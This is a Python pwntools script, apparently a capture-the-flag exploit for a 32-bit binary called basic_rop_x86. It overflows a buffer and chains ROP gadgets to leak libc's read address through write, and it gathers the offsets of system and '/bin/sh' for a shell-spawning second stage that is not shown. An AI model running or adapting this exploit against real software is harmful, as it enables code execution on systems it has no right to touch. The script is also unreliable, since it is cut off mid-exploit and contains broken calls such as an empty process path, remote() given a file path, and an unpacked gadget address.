from pwn import *

TEST = True

if TEST:
    p = process("",12)
    e = ELF("./basic_rop_x86")
    libc = e.libc
else :
    p = remote("./basic_rop_x86")
    e = ELF("./basic_rop_x86")
    libc = ELF("./libc.so.6")


r = ROP(e)

read_plt = e.plt["read"]
read_got = e.got["read"]
write_plt = e.plt["write"]
write_got = e.got["write"]
main = e.symbols["main"]

read_offset = libc.symbols["read"]
system_offset = libc.symbols["system"]
sh_offset = list(libc.search(b"/bin/sh"))[0]

pop_ret = r.find_gadget(['pop ebp', 'ret'])[0]
pop2_ret = r.find_gadget(['pop edi', 'pop ebp', 'ret'])[0]
pop3_ret = r.find_gadget(['pop esi', 'pop edi', 'pop ebp', 'ret'])[0]


#1단계
payload = b'A' * 0x48
payload += p32(write_plt)
payload +=(pop3_ret)
payload += p32(1) + p32(read_got) + p32(4)
payload += p32(main)

p.send(payload)
p.recvuntil(b'A' * 0x40)


read = u32(p.recvn(4))